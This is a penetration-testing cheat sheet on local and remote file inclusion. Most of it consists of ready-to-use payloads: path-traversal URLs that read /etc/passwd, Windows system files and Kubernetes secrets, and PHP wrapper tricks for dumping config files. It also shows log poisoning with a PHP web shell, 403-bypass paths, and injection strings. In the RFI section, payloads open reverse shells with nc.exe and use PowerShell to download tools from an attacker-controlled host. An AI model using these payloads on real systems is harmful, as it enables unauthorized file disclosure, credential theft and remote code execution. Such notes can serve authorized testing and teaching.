# LFI/RFI

## Tools

```bash
# https://github.com/kurobeats/fimap
fimap -u "http://10.11.1.111/example.php?test="
# https://github.com/P0cL4bs/Kadimus
./kadimus -u localhost/?pg=contact -A my_user_agent
# https://github.com/wireghoul/dotdotpwn
dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix
```

{% hint style="info" %}
**How to**

1. Look requests with filename like `include=main.inc template=/en/sidebar file=foo/file1.txt`
2. Modify and test: `file=foo/bar/../file1.txt` 
   1. If the response is the same could be vulnerable
   2. If not there is some kind of block or sanitizer
3. Try to access world-readable files like `/etc/passwd /win.ini`
{% endhint %}

## LFI

```bash
# Basic LFI
curl -s http://10.11.1.111/gallery.php?page=/etc/passwd

# If LFI, also check
/var/run/secrets/kubernetes.io/serviceaccount

# PHP Filter b64
http://10.11.1.111/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd && base64 -d savefile.php
http://10.11.1.111/index.php?m=php://filter/convert.base64-encode/resource=config
http://10.11.1.111/maliciousfile.txt%00?page=php://filter/convert.base64-encode/resource=../config.php
# Nullbyte ending
http://10.11.1.111/page=http://10.11.1.111/maliciousfile%00.txt
http://10.11.1.111/page=http://10.11.1.111/maliciousfile.txt%00
# Other techniques
https://abc.redact.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c
https://abc.redact.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd
https://abc.redact.com/static/../../../../../../../../../../../../../../../etc/passwd
https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00
https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.html
https://abc.redact.com/asd.php?file:///etc/passwd
https://abc.redact.com/asd.php?file:///etc/passwd%00
https://abc.redact.com/asd.php?file:///etc/passwd%00.html
https://abc.redact.com/asd.php?file:///etc/passwd%00.ext
https://abc.redact.com/asd.php?file:///..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.ext/etc/passwd
https://target.com/admin..;/
https://target.com/../admin
https://target.com/whatever/..;/admin
https://target.com/whatever.php~
# Cookie based
GET /vulnerable.php HTTP/1.1
Cookie:usid=../../../../../../../../../../../../../etc/pasdwd
# LFI Windows
http://10.11.1.111/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00
http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini
http://10.11.1.111/addguestbook.php?LANG=../../../../../../../../../../../../../../../boot.ini
http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini%00
http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini%00.html
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00.html
http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini
http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini%00
http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini%00.html
http://10.11.1.111/addguestbook.php?LANG=file:///C:/boot.ini
http://10.11.1.111/addguestbook.php?LANG=file:///C:/win.ini
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00.ext
http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini%00.ext

# LFI using video upload:
https://github.com/FFmpeg/FFmpeg
https://hackerone.com/reports/226756
https://hackerone.com/reports/237381
https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit
https://github.com/neex/ffmpeg-avi-m3u-xbin

# Contaminating log files
root@kali:~# nc -v 10.11.1.111 80
10.11.1.111: inverse host lookup failed: Unknown host
(UNKNOWN) [10.11.1.111] 80 (http) open
 <?php echo shell_exec($_GET['cmd']);?> 
http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig

# Common LFI to RCE:
    Using file upload forms/functions
    Using the PHP wrapper expect://command
    Using the PHP wrapper php://file
    Using the PHP wrapper php://filter
    Using PHP input:// stream
    Using data://text/plain;base64,command
    Using /proc/self/environ
    Using /proc/self/fd
    Using log files with controllable input like:
        /var/log/apache/access.log
        /var/log/apache/error.log
        /var/log/vsftpd.log
        /var/log/sshd.log
        /var/log/mail

# LFI possibilities by filetype
    ASP / ASPX / PHP5 / PHP / PHP3: Webshell / RCE
    SVG: Stored XSS / SSRF / XXE
    GIF: Stored XSS / SSRF
    CSV: CSV injection
    XML: XXE
    AVI: LFI / SSRF
    HTML / JS : HTML injection / XSS / Open redirect
    PNG / JPEG: Pixel flood attack (DoS)
    ZIP: RCE via LFI / DoS
    PDF / PPTX: SSRF / BLIND XXE
    
# Chaining with other vulns    
../../../tmp/lol.png —> for path traversal
sleep(10)-- -.jpg —> for SQL injection
<svg onload=alert(document.domain)>.jpg/png —> for XSS
; sleep 10; —> for command injections

# 403 bypasses
/accessible/..;/admin
/.;/admin
/admin;/
/admin/~
/./admin/./
/admin?param
/%2e/admin
/admin#
/secret/
/secret/.
//secret//
/./secret/..
/admin..;/
/admin%20/
/%20admin%20/
/admin%20/page
/%61dmin

# Path Bypasses
# 16-bit Unicode encoding
# double URL encoding
# overlong UTF-8 Unicode encoding
….//
….\/
…./\
….\\
```

## RFI

```bash
# RFI:
http://10.11.1.111/addguestbook.php?LANG=http://10.11.1.111:31/evil.txt%00
Content of evil.txt:
<?php echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe") ?>
# RFI over SMB (Windows)
cat php_cmd.php
    <?php echo shell_exec($_GET['cmd']);?>
# Start SMB Server in attacker machine and put evil script
# Access it via browser (2 request attack):
# http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c Invoke-WebRequest -Uri "http://10.10.14.42/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"
# http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe ATTACKER_IP 1234

# Cross Content Hijacking:
https://github.com/nccgroup/CrossSiteContentHijacking
https://soroush.secproject.com/blog/2014/05/even-uploading-a-jpg-file-can-lead-to-cross-domain-data-hijacking-client-side-attack/
http://50.56.33.56/blog/?p=242

# Encoding scripts in PNG IDAT chunk:
https://yqh.at/scripts_in_pngs.php

```

